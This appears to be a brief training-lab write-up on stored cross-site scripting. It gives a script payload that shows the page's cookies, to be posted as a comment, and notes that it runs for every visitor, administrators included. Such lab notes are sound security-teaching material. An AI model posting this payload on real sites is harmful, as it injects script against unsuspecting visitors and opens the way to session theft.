# Lab 2 — Stored XSS HTML Context, Nothing Encoded (APPRENTICE)

## Payload
Post as comment body:
```html
<script>alert(document.cookie)</script>
```

## Impact
Fires for every visitor — including administrators.
